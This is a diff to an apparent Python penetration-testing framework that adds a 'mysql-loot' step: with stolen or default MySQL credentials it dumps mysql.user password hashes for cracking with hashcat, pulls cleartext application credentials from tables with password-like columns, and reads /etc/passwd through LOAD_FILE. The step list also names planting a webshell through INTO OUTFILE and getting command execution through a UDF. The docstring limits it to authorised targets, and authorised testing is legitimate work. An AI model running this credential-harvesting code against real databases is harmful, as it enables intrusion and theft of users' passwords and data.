@@ -2290,6 +2290,29 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
         return None
 
+    # 2bj) mysql-loot: app creds > user hashes / file-read > db inventory
+    if sid == "mysql-loot":
+        appc = re.findall(r"^✗ CRED (.+)$", output, re.M)
+        hashes = re.findall(r"^✗ HASH ", output, re.M)
+        fread = re.search(r"^✗ FILE-READ ", output, re.M)
+        dbs = re.findall(r"^· DB ", output, re.M)
+        if appc:
+            shown = "; ".join(c.strip() for c in appc[:2]) + (f" +{len(appc) - 2}" if len(appc) > 2 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"MySQL app creds: {shown}"[:140]}
+        if hashes or fread:
+            bits = []
+            if hashes:
+                bits.append(f"{len(hashes)} mysql.user hash(es)")
+            if fread:
+                bits.append("LOAD_FILE /etc/passwd")
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"MySQL loot: {', '.join(bits)}"[:140]}
+        if dbs:
+            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"MySQL: {len(dbs)} non-system database(s) readable"[:140]}
+        return None
+
     # 2bi) mysql-creds: default/reused login or CVE-2012-2122 bypass → DB access
     if sid == "mysql-creds":
         if re.search(r"^✗ BYPASS ", output, re.M):
@@ -3345,8 +3368,7 @@ _EXPLOIT_STEPS = {
     "mysql": [
         ("Banner: handshake → version + auth plugin → searchsploit", "mysql-banner"),
         ("Root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x", "mysql-creds"),
-        "Enumerate databases & users; dump app creds & password hashes",
-        "Read local files with LOAD_FILE (needs FILE priv / secure_file_priv)",
+        ("Loot: DBs/users, mysql.user hashes, app creds, LOAD_FILE", "mysql-loot"),
         "Write a webshell with INTO OUTFILE into a writable web root",
         "UDF (lib_mysqludf_sys) for OS command execution if the plugin dir is writable",
         "Manual steps & further research",
@@ -12768,6 +12790,105 @@ def _tool_mysql_creds(ip: str, port: int, proto: str) -> str:
     return f"MySQL credentials — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── MySQL step 3: loot — enumerate DBs/users, dump hashes & app creds, LOAD_FILE ──
+_MYSQLLOOT_DEADLINE = 120
+_MYSQL_SYSDB = ("information_schema", "performance_schema", "sys", "mysql")
+
+
+def _tool_mysql_loot(ip: str, port: int, proto: str) -> str:
+    """MySQL step 3 tool: with a proven cred, enumerate databases, dump the mysql.user password
+    hashes (→ crack), harvest cleartext app credentials from tables with password-like columns, and
+    LOAD_FILE /etc/passwd when the FILE privilege allows it. Read-only queries via the mysql CLI. No
+    stored cred / no client → raises. Authorised targets only."""
+    import time
+    creds = _gather_mysql_creds(ip)
+    if not creds:
+        raise RuntimeError("no MySQL creds — run mysql-creds (r2) first")
+    if not (shutil.which("mysql") or shutil.which("mariadb")):
+        raise RuntimeError("mysql/mariadb client required for loot (query execution)")
+
+    user = pw = None
+    for u, p in creds:
+        rc, _o = _mysql_query(ip, port, u, p, "SELECT 1")
+        if rc == 0:
+            user, pw = u, p
+            break
+    if user is None:
+        raise RuntimeError("stored MySQL creds no longer authenticate — re-run mysql-creds (r2)")
+
+    deadline = time.time() + _MYSQLLOOT_DEADLINE
+
+    def q(sql, t=15):
+        return _mysql_query(ip, port, user, pw, sql, timeout=t)
+
+    rc, ctx = q("SELECT current_user(), version(), IFNULL(@@secure_file_priv,'NULL')")
+    who = ver = sfp = ""
+    if rc == 0 and ctx.strip():
+        parts = ctx.strip().split("\t")
+        who, ver, sfp = (parts + ["", "", ""])[:3]
+    _rc, grants = q("SHOW GRANTS")
+    file_priv = bool(re.search(r"\bFILE\b|ALL PRIVILEGES", grants or ""))
+
+    rc, dbs = q("SHOW DATABASES")
+    userdbs = [d for d in (dbs.split("\n") if rc == 0 else []) if d and d not in _MYSQL_SYSDB]
+
+    rc, hs = q("SELECT User, authentication_string FROM mysql.user WHERE authentication_string<>''")
+    if rc != 0 or not hs.strip():
+        rc, hs = q("SELECT User, Password FROM mysql.user WHERE Password<>''")
+    hashes = []
+    if rc == 0:
+        for ln in hs.split("\n"):
+            if "\t" in ln:
+                u, h = ln.split("\t", 1)
+                if h.strip() and h.strip() != "NULL":
+                    hashes.append((u.strip(), h.strip()))
+
+    rc, cols = q("SELECT table_schema,table_name,column_name FROM information_schema.columns "
+                 "WHERE table_schema NOT IN ('information_schema','performance_schema','sys','mysql') "
+                 "AND column_name REGEXP 'pass|pwd|secret|token' LIMIT 40")
+    tables = {}
+    if rc == 0:
+        for ln in cols.split("\n"):
+            p = ln.split("\t")
+            if len(p) == 3:
+                tables.setdefault((p[0], p[1]), []).append(p[2])
+    appcreds = []
+    for (schema, table), passcols in list(tables.items())[:8]:
+        if time.time() > deadline:
+            break
+        rc, idc = q(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{schema}' "
+                    f"AND table_name='{table}' AND column_name REGEXP 'user|email|login|name' LIMIT 1")
+        idcol = idc.strip().split("\n")[0] if rc == 0 and idc.strip() else None
+        sel = f"`{idcol}`,`{passcols[0]}`" if idcol else f"`{passcols[0]}`"
+        rc, rows = q(f"SELECT {sel} FROM `{schema}`.`{table}` LIMIT 5")
+        if rc == 0:
+            for ln in rows.split("\n"):
+                if ln.strip():
+                    appcreds.append((f"{schema}.{table}", ln.strip().replace("\t", ":")))
+
+    fileread = None
+    if file_priv and sfp in ("", "NULL"):
+        rc, pf = q("SELECT LOAD_FILE('/etc/passwd')")
+        if rc == 0 and "root:" in (pf or ""):
+            fileread = pf.strip().split("\n")[0]
+
+    lines = [f"[*] as {who or user} · {ver} · FILE priv: {'yes' if file_priv else 'no'} · "
+             f"secure_file_priv: {sfp or '(empty)'}"]
+    for u, h in hashes[:20]:
+        lines.append(f"✗ HASH {u} {h[:60]}  (mysql.user — crack: hashcat -m 300)")
+    for src, val in appcreds[:20]:
+        lines.append(f"✗ CRED {val[:80]}  ({src})")
+    if fileread:
+        lines.append(f"✗ FILE-READ /etc/passwd — {fileread}")
+    for d in userdbs[:20]:
+        lines.append(f"· DB {d}")
+    if file_priv:
+        lines.append("· FILE priv → LOAD_FILE app configs / SSH keys; INTO OUTFILE / UDF RCE (r4)")
+    elif not hashes and not appcreds:
+        lines.append("· no hashes/app-creds surfaced — check other DBs manually; no FILE priv for RCE")
+    return f"MySQL loot — {ip}:{port}\n\n" + "\n".join(lines)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -12908,6 +13029,7 @@ _STEP_TOOLS = {
     "telnet-next": ("manual telnet steps (context-aware, reference only)", _tool_telnet_next),
     "mysql-banner": ("MySQL/MariaDB handshake → version + auth plugin → searchsploit (stdlib)", _tool_mysql_banner),
     "mysql-creds": ("root no-pass + default/reused creds; CVE-2012-2122 bypass (mysql CLI / netexec)", _tool_mysql_creds),
+    "mysql-loot": ("dump DBs/users, mysql.user hashes, app creds, LOAD_FILE (mysql CLI, read-only)", _tool_mysql_loot),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -12992,6 +13114,7 @@ _STEP_TOOL_RUNS = {
     "telnet-next":      ("reference · no scan", None),
     "mysql-banner":     ("Python (stdlib) + searchsploit", None),
     "mysql-creds":      ("mysql CLI / netexec", f"{_mins(_MYSQLCREDS_DEADLINE)} min"),
+    "mysql-loot":       ("mysql CLI", f"{_mins(_MYSQLLOOT_DEADLINE)} min"),
     "spawn-shell":      ("router → service foothold", None),
 }
 
